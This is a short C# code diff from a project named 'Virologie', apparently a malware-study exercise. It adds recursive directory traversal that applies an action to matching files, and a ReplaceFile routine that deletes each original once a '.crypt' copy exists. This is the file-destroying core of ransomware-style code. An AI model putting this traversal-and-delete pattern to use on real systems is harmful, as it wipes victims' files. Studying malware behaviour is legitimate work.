@@ -10,12 +10,28 @@ namespace Virologie
     {
         public delegate void FileAction(string filename);
 
-        public IEnumerable<string> EnumerateFiles(string startDir, string filter)
+        public void ApplyTo(string startDir, IEnumerable<string> filters, FileAction action)
         {
-            return Directory.GetFiles(startDir, filter, SearchOption.AllDirectories);
+            var enumerable = filters as IList<string> ?? filters.ToList();
+            foreach (var filter in enumerable)
+            {
+                foreach (var file in EnumerateFiles(startDir, filter))
+                {
+                    action(file);
+                }
+            }
+            foreach (var directory in Directory.GetDirectories(startDir))
+            {
+                ApplyTo(directory, enumerable, action);
+            }
         }
 
-        public void ReplaceFile(string name)
+        public IEnumerable<string> EnumerateFiles(string startDir, string filter)
+        {
+            return Directory.GetFiles(startDir, filter, SearchOption.TopDirectoryOnly);
+        }
+
+        static public void ReplaceFile(string name)
         {
             if (!File.Exists(name + ".crypt")) return;
             File.Delete(name);
